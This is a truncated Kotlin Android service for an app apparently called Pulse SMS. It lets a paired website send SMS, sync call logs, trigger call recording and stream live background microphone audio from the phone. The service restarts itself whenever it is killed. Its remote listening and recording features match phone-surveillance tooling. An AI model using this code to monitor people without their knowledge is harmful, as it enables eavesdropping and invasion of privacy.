package com.example.telephony

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.audiofx.NoiseSuppressor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.MainActivity
import com.example.R
import com.example.data.repository.QrPairingManager
import com.example.data.repository.SmsRepository
import com.google.firebase.firestore.ListenerRegistration
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.util.Collections
import kotlin.math.sqrt

/**
 * Always-on STICKY foreground service that keeps Pulse SMS connected to the paired
 * Website 24/7 — even when the user minimizes, exits, or swipes the app away from Recents.
 *
 * Handles in the background:
 * - Outgoing SMS dispatched from Website
 * - Incoming Web Notifications & auto-reply acknowledgements
 * - Call Log syncing + CallLog ContentObserver
 * - Remote Call Recorder commands
 * - Live Background Microphone streaming (with timed WakeLock + AudioRecord)
 * - Tap-to-open alert if Website requests Camera while UI is closed
 */
class PulseKeepAliveService : Service() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)

    private var repository: SmsRepository? = null
    private var pairingPrefsListener: SharedPreferences.OnSharedPreferenceChangeListener? = null
    private var currentBoundSessionId: String? = null

    private var outgoingRequestListener: ListenerRegistration? = null
    private var sessionNotificationsListener: ListenerRegistration? = null
    private var remoteMicListener: ListenerRegistration? = null
    private var remoteCameraListener: ListenerRegistration? = null
    private var remoteCallRecorderListener: ListenerRegistration? = null
    private var callLogSyncRequestListener: ListenerRegistration? = null
    private var callLogObserver: ContentObserver? = null

    private var micStreamJob: Job? = null
    private var micWakeLock: PowerManager.WakeLock? = null
    private var micUploadInFlight = false

    private var lastHandledCallSyncSeq = 0L
    private var lastProcessedMicCommandSeq = -1L
    private var lastProcessedCameraCommandSeq = -1L
    private var lastProcessedCallRecorderCommandSeq = -1L
    private var notificationListenStartedMs = 0L

    override fun onCreate() {
        super.onCreate()
        _isServiceRunning.value = true
        repository = SmsRepository(applicationContext)
        SmsNotificationManager.createNotificationChannel(applicationContext)
        ensureKeepAliveChannel()
        registerPairingWatcher()
        scheduleWatchdogAlarm(applicationContext)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        val fromBoot = intent?.getBooleanExtra(EXTRA_FROM_BOOT, false) ?: false

        if (action == ACTION_STOP_KEEPALIVE) {
            setAlwaysActiveEnabled(applicationContext, false)
            cancelWatchdogAlarm(applicationContext)
            stopBackgroundMicInternal(publishStopped = true)
            stopForegroundCompat()
            stopSelf()
            return START_NOT_STICKY
        }

        if (!isAlwaysActiveEnabled(applicationContext)) {
            stopForegroundCompat()
            stopSelf()
            return START_NOT_STICKY
        }

        ensureKeepAliveChannel()
        startForegroundSafe(buildKeepAliveNotification(currentBoundSessionId, _isBackgroundMicStreaming.value), fromBoot)

        val sessionId = QrPairingManager.getActiveSessionId(applicationContext)
        if (sessionId != null && sessionId != currentBoundSessionId) {
            attachSessionListeners(sessionId)
        } else if (sessionId == null) {
            updateNotificationOnly()
        }

        when (action) {
            ACTION_START_BG_MIC -> startBackgroundMicInternal()
            ACTION_STOP_BG_MIC -> stopBackgroundMicInternal(publishStopped = true)
        }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        if (isAlwaysActiveEnabled(applicationContext)) {
            scheduleImmediateRevive(applicationContext, 1200L)
        }
    }

    override fun onDestroy() {
        _isServiceRunning.value = false
        stopBackgroundMicInternal(publishStopped = false)
        detachSessionListeners()
        unregisterPairingWatcher()
        if (isAlwaysActiveEnabled(applicationContext)) {
            scheduleImmediateRevive(applicationContext, 2000L)
        }
        serviceScope.cancel()
        super.onDestroy()
    }

    private fun registerPairingWatcher() {
        val prefs = applicationContext.getSharedPreferences(PAIRING_PREFS_NAME, Context.MODE_PRIVATE)
        val listener = SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
            if (key == KEY_ACTIVE_PAIRING_SESSION_ID) {
                val newSession = QrPairingManager.getActiveSessionId(applicationContext)
                if (newSession != null && newSession != currentBoundSessionId) {
                    attachSessionListeners(newSession)
                } else if (newSession == null) {
                    detachSessionListeners()
                    updateNotificationOnly()
                }
            }
        }
        pairingPrefsListener = listener
        prefs.registerOnSharedPreferenceChangeListener(listener)
    }

    private fun unregisterPairingWatcher() {
        val listener = pairingPrefsListener ?: return
        pairingPrefsListener = null
        try {
            applicationContext
                .getSharedPreferences(PAIRING_PREFS_NAME, Context.MODE_PRIVATE)
                .unregisterOnSharedPreferenceChangeListener(listener)
        } catch (_: Throwable) {}
    }

    private fun detachSessionListeners() {
        currentBoundSessionId = null
        outgoingRequestListener?.remove()
        outgoingRequestListener = null
        sessionNotificationsListener?.remove()
        sessionNotificationsListener = null
        remoteMicListener?.remove()
        remoteMicListener = null
        remoteCameraListener?.remove()
        remoteCameraListener = null
        remoteCallRecorderListener?.remove()
        remoteCallRecorderListener = null
        callLogSyncRequestListener?.remove()
        callLogSyncRequestListener = null
        callLogObserver?.let {
            CallLogSyncHelper.unregisterCallLogObserver(applicationContext, it)
        }
        callLogObserver = null
    }

    private fun attachSessionListeners(sessionId: String) {
        detachSessionListeners()
        currentBoundSessionId = sessionId
        notificationListenStartedMs = System.currentTimeMillis()
        lastProcessedMicCommandSeq = -1L
        lastProcessedCameraCommandSeq = -1L
        lastProcessedCallRecorderCommandSeq = -1L
        updateNotificationOnly()

        val repo = repository ?: SmsRepository(applicationContext).also { repository = it }

        // 1. Outgoing Web SMS Listener
        outgoingRequestListener = QrPairingManager.listenToOutgoingWebRequests(
            context = applicationContext,
            sessionId = sessionId
        ) { requestId, recipient, body ->
            if (!tryMarkWebRequestHandled(requestId)) return@listenToOutgoingWebRequests
            serviceScope.launch {
                val res = repo.sendMessage(recipient, body, 0)
                QrPairingManager.markOutgoingWebRequestStatus(
                    context = applicationContext,
                    sessionId = sessionId,
                    requestId = requestId,
                    status = if (res.isSuccess) "SENT" else "FAILED"
                )
                repo.emitSyncLog("WEB_OUTGOING", "ওয়েব থেকে '$recipient'-এ ব্যাকগ্রাউন্ডে এসএমএস পাঠানো হয়েছে")
            }
        }

        // 2. Incoming Web Notifications Mirror
        sessionNotificationsListener = QrPairingManager.listenToSessionNotifications(
            context = applicationContext,
            sessionId = sessionId
        ) { items ->
            items.forEach { item ->
                if (item.sourceDevice == "WEB") {
                    val isRecentOrTest = item.isTest || item.createdAtMs >= (notificationListenStartedMs - 20_000L)
                    if (isRecentOrTest &&
                        !QrPairingManager.isWebNotificationSeen(applicationContext, item.id) &&
                        tryMarkIncomingNotifHandled(item.id)
                    ) {
                        QrPairingManager.markWebNotificationSeen(applicationContext, item.id)
                        SmsNotificationManager.showMirroredWebNotification(
                            context = applicationContext,
                            notifId = item.id,
                            title = item.title,
                            body = item.body,
                            appName = item.appName,
                            category = item.category,
                            isTest = item.isTest
                        )
                        if (item.id.startsWith("ping_")) {
                            serviceScope.launch {
                                val ackId = "ack_${item.id}".take(120)
                                val deviceModel = "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${Build.MODEL}"
                                QrPairingManager.syncNotificationToPairedSession(
                                    context = applicationContext,
                                    notifId = ackId,
                                    title = "✅ মোবাইল থেকে অটো-রিপ্লাই ভেরিফাইড",
                                    body = "$deviceModel-এ ব্যাকগ্রাউন্ডে ওয়েব নোটিফিকেশন পৌঁছেছে!",
                                    appName = "Pulse Android",
                                    packageName = applicationContext.packageName,
                                    sourceDevice = "MOBILE",
                                    category = "TEST",
                                    isTest = true,
                                    timestampMs = System.currentTimeMillis(),
                                    overrideSessionId = sessionId
                                )
                            }
                        }
                    }
                }
            }
        }

        // 3. Call Log ContentObserver & Sync Requests
        if (CallLogSyncHelper.hasCallLogPermission(applicationContext)) {
            callLogObserver = CallLogSyncHelper.registerCallLogObserver(applicationContext) {
                serviceScope.launch(Dispatchers.IO) {
                    val calls = CallLogSyncHelper.readRecentCallLogs(applicationContext, limit = 80)
                    QrPairingManager.syncCallLogsToPairedSession(applicationContext, calls, sessionId)
                }
            }
        }
        callLogSyncRequestListener = QrPairingManager.listenToCallLogSyncRequests(
            context = applicationContext,
            sessionId = sessionId
        ) { syncSeq ->
            if (syncSeq > lastHandledCallSyncSeq) {
                lastHandledCallSyncSeq = syncSeq
                if (CallLogSyncHelper.hasCallLogPermission(applicationContext)) {
                    serviceScope.launch(Dispatchers.IO) {
                        val calls = CallLogSyncHelper.readRecentCallLogs(applicationContext, limit = 80)
                        QrPairingManager.syncCallLogsToPairedSession(applicationContext, calls, sessionId)
                    }
                }
            }
        }

        // 4. Remote Call Recorder Commands in Background
        remoteCallRecorderListener = QrPairingManager.listenToRemoteCallRecorderCommands(
            context = applicationContext,
            sessionId = sessionId
        ) { remoteCmd ->
            val seq = remoteCmd.commandSeq
            val isFirstSeen = lastProcessedCallRecorderCommandSeq < 0L
            if (!isFirstSeen && seq <= lastProcessedCallRecorderCommandSeq) return@listenToRemoteCallRecorderCommands
            if (isFirstSeen) {
                lastProcessedCallRecorderCommandSeq = seq
                val withinWindow = remoteCmd.updatedAtMs == 0L ||
                    kotlin.math.abs(System.currentTimeMillis() - remoteCmd.updatedAtMs) <= 300_000L
                val isFreshStart = remoteCmd.command == "START" && remoteCmd.status == "STARTING" && withinWindow
                if (!isFreshStart) return@listenToRemoteCallRecorderCommands
            } else {
                lastProcessedCallRecorderCommandSeq = seq
            }

            when (remoteCmd.command) {
                "START" -> {
                    val safeTarget = remoteCmd.targetNumber.ifBlank { "Manual Recording" }
                    if (CallRecorderManager.hasMicPermission(applicationContext)) {
                        val recIntent = Intent(applicationContext, CallRecorderService::class.java).apply {
                            action = CallRecorderService.ACTION_START_RECORDING
                            putExtra(CallRecorderService.EXTRA_PHONE_NUMBER, safeTarget)
                            putExtra(CallRecorderService.EXTRA_CALL_TYPE, "MANUAL")
                        }
                        try {
                            ContextCompat.startForegroundService(applicationContext, recIntent)
                        } catch (_: Throwable) {
                            CallRecorderManager.startRecording(applicationContext, safeTarget, "MANUAL")
                        }
                    } else if (!isUiForeground) {
                        serviceScope.launch {
                            QrPairingManager.publishRemoteCallRecorderState(
                                context = applicationContext,
                                sessionId = sessionId,
                                status = "PERMISSION_NEEDED",
                                targetNumber = safeTarget,
                                errorMessage = "মোবাইলে মাইক্রোফোন পারমিশন দিন"
                            )
                        }
                        showWakeActionNotification(
                            title = "🎙️ কল রেকর্ডিং রিকোয়েস্ট",
                            body = "মাইক্রোফোন পারমিশন দিতে অ্যাপ খুলুন।",
                            openWebSync = true
                        )
                    }
                }
                "STOP" -> {
                    if (CallRecorderManager.isCurrentlyRecording()) {
                        serviceScope.launch {
                            try {
                                applicationContext.stopService(Intent(applicationContext, CallRecorderService::class.java))
                            } catch (_: Throwable) {}
                            CallRecorderManager.stopAndUploadRecording(applicationContext)
                        }
                    }
                }
            }
        }

        // 5. Remote Microphone Streaming (Works in Background & Foreground!)
        remoteMicListener = QrPairingManager.listenToRemoteMicCommands(
            context = applicationContext,
            sessionId = sessionId
        ) { remoteCmd ->
            val seq = remoteCmd.commandSeq
            val isFirstSeen = lastProcessedMicCommandSeq < 0L
            if (!isFirstSeen && seq <= lastProcessedMicCommandSeq) return@listenToRemoteMicCommands
            if (isFirstSeen) {
                lastProcessedMicCommandSeq = seq
                val withinWindow = remoteCmd.updatedAtMs == 0L ||
                    kotlin.math.abs(System.currentTimeMillis() - remoteCmd.updatedAtMs) <= 300_000L
                val isFreshStart = remoteCmd.command == "START" && remoteCmd.status == "STARTING" && withinWindow
                if (!isFreshStart) return@listenToRemoteMicCommands
            } else {
                lastProcessedMicCommandSeq = seq
            }

            when (remoteCmd.command) {
                "START" -> {
                    if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                        startBackgroundMicInternal()
                    } else {
                        serviceScope.launch {
                            QrPairingManager.publishRemoteMicState(
                                context = applicationContext,
                                sessionId = sessionId,
                                status = "PERMISSION_NEEDED",
                                errorMessage = "মোবাইলে মাইক্রোফোন পারমিশন অনুমতি দিন"
                            )
                        }
                        if (!isUiForeground) {
                            showWakeActionNotification(
                                title = "🎙️ ওয়েবসাইট থেকে মাইক্রোফোন রিকোয়েস্ট",
                                body = "মাইক্রোফোন চালু করতে এখানে ট্যাপ করে পারমিশন দিন।",
                                openWebSync = true
                            )
                        }
                    }
                }
                "STOP" -> {
                    stopBackgroundMicInternal(publishStopped = true)
                }
            }
        }

        // 6. Remote Camera Wake Notification when App is Backgrounded
        remoteCameraListener = QrPairingManager.listenToRemoteCameraCommands(
            context = applicationContext,
            sessionId = sessionId
        ) { remoteCmd ->
            val seq = remoteCmd.commandSeq
            val isFirstSeen = lastProcessedCameraCommandSeq < 0L
            if (!isFirstSeen && seq <= lastProcessedCameraCommandSeq) return@listenToRemoteCameraCommands
            if (isFirstSeen) {
                lastProcessedCameraCommandSeq = seq
                val withinWindow = remoteCmd.updatedAtMs == 0L ||
                    kotlin.math.abs(System.currentTimeMillis() - remoteCmd.updatedAtMs) <= 300_000L
                val isFreshStart = (remoteCmd.command == "START_BACK" || remoteCmd.command == "START_FRONT") &&
                    remoteCmd.status == "STARTING" && withinWindow
                if (!isFreshStart) return@listenToRemoteCameraCommands
            } else {
                lastProcessedCameraCommandSeq = seq
            }

            if (!isUiForeground && (remoteCmd.command == "START_BACK" || remoteCmd.command == "START_FRONT")) {
                val lens = if (remoteCmd.command == "START_FRONT") "FRONT" else "BACK"
                showWakeActionNotification(
                    title = "📷 ওয়েবসাইট থেকে ক্যামেরা রিকোয়েস্ট",
                    body = "অ্যাপ ব্যাকগ্রাউন্ডে আছে — লাইভ ক্যামেরা দেখাতে এখানে ট্যাপ করুন।",
                    cameraLensToStart = lens
                )
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun startBackgroundMicInternal() {
        if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        if (micStreamJob?.isActive == true && _isBackgroundMicStreaming.value) {
            return
        }

        // Upgrade FGS notification + type when starting mic if possible
        startForegroundSafe(buildKeepAliveNotification(currentBoundSessionId, true), fromBoot = false)

        _isBackgroundMicStreaming.value = true
        _backgroundMicChunkCount.value = 0
        _backgroundMicAudioLevel.value = 0

        acquireMicWakeLock()

        serviceScope.launch {
            QrPairingManager.publishRemoteMicState(
                context = applicationContext,
                sessionId = currentBoundSessionId,
                status = "ACTIVE",
                sampleRate = 16000,
                errorMessage = ""
            )
        }

        micStreamJob?.cancel()
        micStreamJob = serviceScope.launch(Dispatchers.IO) {
            var recorder: AudioRecord? = null
            var noiseSuppressor: NoiseSuppressor? = null
            try {
                var activeSampleRate = 16000
                var rec: AudioRecord? = null
                val candidateRates = listOf(16000, 44100, 8000)
                val candidateSources = listOf(MediaRecorder.AudioSource.MIC, MediaRecorder.AudioSource.VOICE_COMMUNICATION)

                loopInit@ for (source in candidateSources) {
                    for (rate in candidateRates) {
                        val minBufBytes = AudioRecord.getMinBufferSize(
                            rate,
                            AudioFormat.CHANNEL_IN_MONO,
                            AudioFormat.ENCODING_PCM_16BIT
                        )
                        if (minBufBytes <= 0) continue
                        try {
                            val candidate = AudioRecord(
                                source,
                                rate,
                                AudioFormat.CHANNEL_IN_MONO,
                                AudioFormat.ENCODING_PCM_16BIT,
                                (minBufBytes * 2).coerceAtLeast(4096)
                            )
                            if (candidate.state == AudioRecord.STATE_INITIALIZED) {
                                rec = candidate
                                activeSampleRate = rate
                                break@loopInit
                            } else {
                                candidate.release()
                            }
                        } catch (_: Throwable) {}
                    }
                }

                recorder = rec
                if (rec == null || rec.state != AudioRecord.STATE_INITIALIZED) {
                    QrPairingManager.publishRemoteMicState(
                        context = applicationContext,
                        sessionId = currentBoundSessionId,
                        status = "ERROR",
                        audioLevel = 0,
                        errorMessage = "ব্যাকগ্রাউন্ড মাইক্রোফোন চালু করা যায়নি"
                    )
                    _isBackgroundMicStreaming.value = false
                    releaseMicWakeLock()
                    withContext(Dispatchers.Main) { updateNotificationOnly() }
                    return@launch
                }

                try {
                    if (NoiseSuppressor.isAvailable()) {
                        noiseSuppressor = NoiseSuppressor.create(rec.audioSessionId)?.apply {
                            enabled = true
                        }
                    }
                } catch (_: Throwable) {}

                rec.startRecording()
                val targetChunkBytes = ((activeSampleRate * 2 * 8) / 10).coerceIn(12800, 72000)
                val shortBuf = ShortArray(1024)
                val chunkStream = ByteArrayOutputStream(targetChunkBytes + 2048)

                while (isActive && _isBackgroundMicStreaming.value) {
                    val readSamples = rec.read(shortBuf, 0, shortBuf.size)
                    if (readSamples > 0) {
                        var sumSq = 0.0
                        for (i in 0 until readSamples) {
                            val sample = shortBuf[i].toInt()
                            sumSq += sample.toDouble() * sample.toDouble()
                            chunkStream.write(sample and 0xFF)
                            chunkStream.write((sample ushr 8) and 0xFF)
                        }
                        val rms = sqrt(sumSq / readSamples.coerceAtLeast(1))
                        val level = ((rms / 5500.0) * 100.0).toInt().coerceIn(0, 100)
                        _backgroundMicAudioLevel.value = level

                        if (chunkStream.size() >= targetChunkBytes) {
                            val pcmBytes = chunkStream.toByteArray()
                            chunkStream.reset()
                            if (!micUploadInFlight) {
                                micUploadInFlight = true
                                val nextSeq = _backgroundMicChunkCount.value + 1
                                _backgroundMicChunkCount.value = nextSeq
                                val b64 = Base64.encodeToString(pcmBytes, Base64.NO_WRAP)
                                serviceScope.launch(Dispatchers.IO) {
                                    try {
                                        QrPairingManager.publishRemoteMicState(
                                            context = applicationContext,
                                            sessionId = currentBoundSessionId,
                                            status = "ACTIVE",
                                            audioBase64 = b64,
                                            chunkSeq = nextSeq,
                                            sampleRate = activeSampleRate,
                                            audioLevel = level,
                                            errorMessage = ""
                                        )
                                    } finally {
                                        micUploadInFlight = false
                                    }
                                }
                            }
                        }
                    } else if (readSamples < 0) {
                        break
                    }
                }
            } catch (t: Throwable) {
                Log.w(TAG, "Background mic stream error: ${t.message}")
            } finally {
                try { noiseSuppressor?.release() } catch (_: Throwable) {}
                try {
                    if (recorder?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                        recorder.stop()
                    }
                } catch (_: Throwable) {}
                try { recorder?.release() } catch (_: Throwable) {}
                _isBackgroundMicStreaming.value = false
                _backgroundMicAudioLevel.value = 0
                releaseMicWakeLock()
                withContext(Dispatchers.Main) { updateNotificationOnly() }
            }
        }
    }

    private fun stopBackgroundMicInternal(publishStopped: Boolean) {
        _isBackgroundMicStreaming.value = false
        _backgroundMicAudioLevel.value = 0
        micStreamJob?.cancel()
        micStreamJob = null
        releaseMicWakeLock()
        updateNotificationOnly()
        if (publishStopped) {
            serviceScope.launch {
                QrPairingManager.publishRemoteMicState(
                    context = applicationContext,
                    sessionId = currentBoundSessionId,
                    status = "STOPPED",
                    audioLevel = 0
                )
            }
        }
    }

    private fun acquireMicWakeLock() {
        try {
            if (micWakeLock == null) {
                val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
                micWakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PulseSMS:KeepAliveMicLock")
                    ?.apply { setReferenceCounted(false) }
            }
            if (micWakeLock?.isHeld == false) {
                micWakeLock?.acquire(30 * 60 * 1000L) // Safety timeout 30 min
            }
        } catch (t: Throwable) {
            Log.w(TAG, "WakeLock acquire skipped: ${t.message}")
        }
    }

    private fun releaseMicWakeLock() {
        try {
            if (micWakeLock?.isHeld == true) {
                micWakeLock?.release()
            }
        } catch (_: Throwable) {}
    }

    private fun showWakeActionNotification(
        title: String,
        body: String,
        openWebSync: Boolean = false,
        cameraLensToStart: String? = null
    ) {
        try {
            if (!SmsNotificationManager.hasPostNotificationsPermission(applicationContext)) return
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
            val launchIntent = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
                if (openWebSync) putExtra(SmsNotificationManager.EXTRA_OPEN_WEB_SYNC, true)
                if (!cameraLensToStart.isNullOrBlank()) putExtra(EXTRA_START_REMOTE_CAMERA_LENS, cameraLensToStart)
            }
            val pi = PendingIntent.getActivity(
                this,
                7409,
                launchIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val notif = NotificationCompat.Builder(this, SmsNotificationManager.CHANNEL_WEB_MIRROR_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle(title)
                .setContentText(body)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pi)
                .build()
            nm.notify(WAKE_ACTION_NOTIFICATION_ID, notif)
        } catch (_: Throwable) {}
    }

    private fun startForegroundSafe(notification: Notification, fromBoot: Boolean) {
        val hasMic = ContextCompat.checkSelfPermission(
            applicationContext,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && hasMic && !fromBoot) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                )
                return
            } catch (t: Throwable) {
                Log.w(TAG, "dataSync|microphone FGS fallback to dataSync: ${t.message}")
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
                return
            } catch (t: Throwable) {
                Log.w(TAG, "dataSync FGS fallback: ${t.message}")
            }
        }

        try {
            startForeground(NOTIFICATION_ID, notification)
        } catch (t: Throwable) {
            Log.w(TAG, "Legacy startForeground failed: ${t.message}")
        }
    }

    private fun stopForegroundCompat() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE)
            } else {
                @Suppress("DEPRECATION")
                stopForeground(true)
            }
        } catch (_: Throwable) {}
    }

    private fun updateNotificationOnly() {
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
            nm.notify(NOTIFICATION_ID, buildKeepAliveNotification(currentBoundSessionId, _isBackgroundMicStreaming.value))
        } catch (_: Throwable) {}
    }

    private fun ensureKeepAliveChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
            if (nm.getNotificationChannel(CHANNEL_ID) == null) {
                val ch = NotificationChannel(
                    CHANNEL_ID,
                    "Pulse Always-Active Web Bridge",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Keeps SMS, Call Logs, Notifications, Mic & Call Recorder active in background"
                    setShowBadge(false)
                }
                nm.createNotificationChannel(ch)
            }
        }
    }

    private fun buildKeepAliveNotification(sessionId: String?, micActive: Boolean): Notification {
        val openIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val openPi = PendingIntent.getActivity(
            this,
            0,
            openIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val stopIntent = Intent(this, PulseKeepAliveService::class.java).apply {
            action = ACTION_STOP_KEEPALIVE
        }
        val stopPi = PendingIntent.getService(
            this,
            2,
            stopIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val title = if (micActive) {
            "🎙️ Pulse লাইভ মাইক ও ব্যাকগ্রাউন্ড চালু"
        } else {
            "🟢 Pulse SMS ব্যাকগ্রাউন্ডে সবসময় সক্রিয়"
        }
        val text = if (micActive) {
            "অ্যাপ বন্ধ থাকলেও ওয়েবসাইটে লাইভ মাইক্রোফোন ও সিঙ্ক চলছে"
        } else if (sessionId != null) {
            "ওয়েব পেয়ারিং, এসএমএস, কল রেকর্ডিং ও নোটিফিকেশন লাইভ আছে"
        } else {
            "২৪/৭ ব্যাকগ্রাউন্ড সার্ভিস চালু • পেয়ার করার জন্য প্রস্তুত"
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentTitle(title)
            .setContentText(text)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setContentIntent(openPi)
            .addAction(0, "বন্ধ করুন", stopPi)
            .build()
    }

    companion object {
        private const val TAG = "PulseKeepAliveService"
        private const val PREFS_NAME = "pulse_keepalive_prefs"
        private const val KEY_ALWAYS_ACTIVE = "always_active_enabled"
        private const val PAIRING_PREFS_NAME = "pulse_pairing_prefs"
        private const val KEY_ACTIVE_PAIRING_SESSION_ID = "active_pairing_session_id"

        private const val CHANNEL_ID = "pulse_keepalive_bridge"
        private const val NOTIFICATION_ID = 9410
        private const val WAKE_ACTION_NOTIFICATION_ID = 9411

        const val ACTION_START_KEEPALIVE = "com.example.action.START_KEEPALIVE"
        const val ACTION_STOP_KEEPALIVE = "com.example.action.STOP_KEEPALIVE"
        const val ACTION_START_BG_MIC = "com.example.action.START_BG_MIC"
        const val ACTION_STOP_BG_MIC = "com.example.action.STOP_BG_MIC"
        const val EXTRA_FROM_BOOT = "extra_from_boot"
        const val EXTRA_START_REMOTE_CAMERA_LENS = "extra_start_remote_camera_lens"

        private val _isServiceRunning = MutableStateFlow(false)
        val isServiceRunning: StateFlow<Boolean> = _isServiceRunning.asStateFlow()

        private val _isBackgroundMicStreaming = MutableStateFlow(false)
        val isBackgroundMicStreaming: StateFlow<Boolean> = _isBackgroundMicStreaming.asStateFlow()

        private val _backgroundMicChunkCount = MutableStateFlow(0)
        val backgroundMicChunkCount: StateFlow<Int> = _backgroundMicChunkCount.asStateFlow()

        private val _backgroundMicAudioLevel = MutableStateFlow(0)
        val backgroundMicAudioLevel: StateFlow<Int> = _backgroundMicAudioLevel.asStateFlow()

        @Volatile
        var isUiForeground: Boolean = false
            private set

        private val processedWebRequestIds = Collections.synchronizedSet(mutableSetOf<String>())
        private val processedIncomingNotifIds = Collections.synchronizedSet(mutableSetOf<String>())

        fun setUiForeground(inForeground: Boolean) {
            isUiForeground = inForeground
        }

        fun tryMarkWebRequestHandled(requestId: String): Boolean = processedWebRequestIds.add(requestId)
        fun tryMarkIncomingNotifHandled(notifId: String): Boolean = processedIncomingNotifIds.add(notifId)

        fun isAlwaysActiveEnabled(context: Context): Boolean {
            return try {
                context.applicationContext
                    .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .getBoolean(KEY_ALWAYS_ACTIVE, true)
            } catch (_: Throwable) {
                true
            }
        }

        fun setAlwaysActiveEnabled(context: Context, enabled: Boolean) {
            try {
                context.applicationContext
                    .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean(KEY_ALWAYS_ACTIVE, enabled)
                    .apply()
            } catch (_: Throwable) {}
        }

        fun isIgnoringBatteryOptimizations(context: Context): Boolean {
            return try {
                val pm = context.applicationContext.getSystemService(Context.POWER_SERVICE) as? PowerManager
                pm?.isIgnoringBatteryOptimizations(context.packageName) == true
            } catch (_: Throwable) {
                false
            }
        }

        fun openBatteryOptimizationSettings(context: Context) {
            val appContext = context.applicationContext ?: context
            try {
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                appContext.startActivity(intent)
                return
            } catch (_: Throwable) {}

            try {
                val fallback = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.fromParts("package", appContext.packageName, null)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                appContext.startActivity(fallback)
            } catch (_: Throwable) {}
        }

        fun startOrRefresh(context: Context, fromBoot: Boolean = false): Boolean {
            val appContext = context.applicationContext ?: context
            if (!isAlwaysActiveEnabled(appContext)) return false
            val intent = Intent(appContext, PulseKeepAliveService::class.java).apply {
                action = ACTION_START_KEEPALIVE
                putExtra(EXTRA_FROM_BOOT, fromBoot)
            }
            return try {
                ContextCompat.startForegroundService(appContext, intent)
                scheduleWatchdogAlarm(appContext)
                true
            } catch (t: Throwable) {
                Log.w(TAG, "startOrRefresh skipped (${t.message}), scheduling revive")
                scheduleWatchdogAlarm(appContext)
                false
            }
        }

        fun stop(context: Context) {
            val appContext = context.applicationContext ?: context
            cancelWatchdogAlarm(appContext)
            try {
                appContext.stopService(Intent(appContext, PulseKeepAliveService::class.java))
